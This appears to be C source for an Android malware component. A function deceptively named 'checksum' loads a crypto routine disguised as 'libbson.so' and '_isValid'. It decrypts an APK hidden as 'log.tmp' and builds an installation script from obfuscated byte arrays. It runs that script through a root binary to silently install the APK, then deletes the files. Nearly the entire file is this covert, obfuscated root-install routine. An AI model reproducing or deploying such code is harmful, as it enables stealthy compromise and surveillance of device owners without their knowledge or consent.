#include <stdio.h>
#include <sys/time.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <dlfcn.h>

#include "shell_params.h"
#include "log.h"
#include "deobfuscate.h"

typedef int (*decrypt_t)(char *);

static unsigned char enc_script[] = "\xc3\x26\x38\x20\x2e\x34\xf0\xc6\xf0\xfb\xea\xf2\x34\xe1\xf6\xf5\x34\xf0\xf7\xc9\xe0\xee\xfb\x2f\x2a\xf0\x2f\x05\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf1\xf2\x2f\x2a\xf0\xc9\xe0\xf7\xf2\xf4\xeb\x2f\x3c\x3a\x3a\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf0\xea\xfb\xfb\xf6\xf5\xec\xf0\x2f\xff\xfa\xfb\x2f\xec\xf3\xf4\xe1\xee\xf3\x2f\xff\xee\xe0\xe8\xee\xec\xea\xe4\xfd\xea\xf1\xf6\xed\xf6\xea\xf1\xe4\xea\xf5\xee\xe1\xf3\xea\x2f\x3f\xc9\xff\xf2\x2f\xeb\xf6\xf0\xee\xe1\xf3\xea\x2f\xe0\xf4\xf2\x35\xee\xf5\xeb\xf1\xf4\xf6\xeb\x35\xfd\xea\xf5\xeb\xf6\xf5\xec\xc9\xf0\xf3\xea\xea\xff\x2f\x3e\xc9\xff\xf2\x2f\xf6\xf5\xf0\xfb\xee\xf3\xf3\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf1\xf2\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9"; // Install script

static unsigned char enc_script2[] = "\xfd\x33\x45\xfc\xf0\x23\xf2\x8f\xfc\xf1\x8f\xf2\xf8\xf1\x8d\xf4\xe2\xf8\x23\x30\xf5\x23\xe2\xf6\xf0\x35\xfc\xf5\xff\xf1\xf6\xf4\xff\x35\xff\x8d\xe2\xf4\x36\x35\xd2\xf8\xf1\x8d\xf4\xe2\xf8\xd0\xfc\xf4\xf5\x19\xf2\xf7\xf8\xf8\xf3\x23\x31\x19\xf2\xf8\x8f\x8f\xf4\xf5\xfe\xf2\x23\xf3\x88\x8f\x23\xfe\xf7\xf6\xe1\xfc\xf7\x23\xf3\xfc\xe2\xfa\xfc\xfe\xf8\xe6\x8d\xf8\xf1\xf4\xfd\xf4\xf8\xf1\xe6\xf8\xf5\xfc\xe1\xf7\xf8\x23\xcc\x19\xf3\xf0\x23\xf8\xf5\xfc\xe1\xf7\xf8\x23\xe2\xf6\xf0\x35\xfc\xf5\xff\xf1\xf6\xf4\xff\x35\x8d\xf8\xf5\xff\xf4\xf5\xfe\x19\xf1\xf0\x23\x38\xf2\x19";

static unsigned char shtmp[] = "\x53\xd9\x8f\x20\xcd\xd9\xce\x25"; // "shtmp"
static unsigned char rcs[] = "\x2f\x84\xac\x43\x40\x48\x01\x5b\x42\x67"; // "log.tmp"
static unsigned char bson_path[] = "\x49\xdd\x85\x99\x99\x9e\xdf\x20\xd5\x9e\xdf\x20\xd5\xd5\xca\xde\xd9\x99\xca\xde"; // "../lib/libbson.so"
static unsigned char bson_sym[] = "\xdc\x2a\xfe\x87\xf5\xf3\x9e\xcd\xf0\xf5\xc8"; // "_isValid"

__attribute__ ((visibility ("default"))) int checksum(void) {
  char current_path_shtmp[512];
  char current_path_rcs[512];
  FILE * install_rcs  = NULL;
  char script[1024];
  char script2[1024];
  char complete_script[2048];
  char script_rcs[512];
  void *handle;
  static unsigned char qzx[] = "\x8c\x90\x1f\x1d\x16\x14"; // "qzx"
  struct stat st;
  char *error;

  LOGD("[APK INSTALLER] Starting apk installation\n");
  LOGD("[APK INSTALLER] Opening crypto lib\n");

  // Open crypto library
  handle = dlopen(deobfuscate(bson_path), RTLD_LAZY);
  if(!handle) {
    LOGD("[APK INSTALLER] Unable to open crypto lib\n");
    return 0;
  }

  decrypt_t decrypt_ptr = (decrypt_t) dlsym(handle, deobfuscate(bson_sym));
  if ((error = dlerror()) != NULL) {
    LOGD("[APK INSTALLER] Unable to find crypto sym\n");
    return 0;
  }

  memset(current_path_shtmp, 0, sizeof(current_path_shtmp));

  // Current script path
  getcwd(current_path_shtmp, sizeof(current_path_shtmp));
  strcat(current_path_shtmp, "/");
  strncpy(current_path_rcs, current_path_shtmp, sizeof(current_path_rcs)); 

  strcat(current_path_shtmp, deobfuscate(shtmp));
  strcat(current_path_rcs, deobfuscate(rcs));

  LOGD("[APK INSTALLER] Installation script path: %s\n", current_path_shtmp);
  LOGD("[APK INSTALLER] Apk path: %s\n", current_path_rcs);

  if(stat(current_path_rcs, &st) < 0) {
    LOGD("[APK INSTALLER] Apk not present... aborting\n");
    return 0;
  }

  install_rcs = fopen(deobfuscate(shtmp), "w");  // installation script

  if(!install_rcs) {
    LOGD("[APK INSTALLER] Script file creation failed... aborting\n");
    return 0;
  }

  // Extract the script
  memset(&script, 0, sizeof(script));
  memset(&complete_script, 0, sizeof(complete_script));

  snprintf(script, sizeof(script), deobfuscate(enc_script), current_path_rcs, current_path_rcs);
  snprintf(script2, sizeof(script2), deobfuscate(enc_script2), current_path_shtmp);

  snprintf(complete_script, sizeof(complete_script), "%s%s", script, script2);

  fwrite(&complete_script, 1, strlen(complete_script), install_rcs);
  fclose(install_rcs);
  chmod(deobfuscate(shtmp), 0777);

  memset(script_rcs, 0, sizeof(script_rcs));
  snprintf(script_rcs, sizeof(script_rcs), "%s %s %s", deobfuscate(ROOT_BIN), deobfuscate(qzx), current_path_shtmp);

  fclose(install_rcs);

  // Decrypt before install
  LOGD("[APK INSTALLER] Decrypting apk...!\n");
  if(!decrypt_ptr(current_path_rcs)) {
    remove(deobfuscate(current_path_shtmp));
    remove(current_path_rcs);
    LOGD("[APK INSTALLER] Decryption failed...!\n");
    return 0;
  }

  LOGD("[APK INSTALLER] Starting installation script!\n");
  system(script_rcs);
  
  LOGD("[APK INSTALLER] All done!\n");
  remove(current_path_shtmp); // Just to be sure
  remove(current_path_rcs); 

  return 1;
}
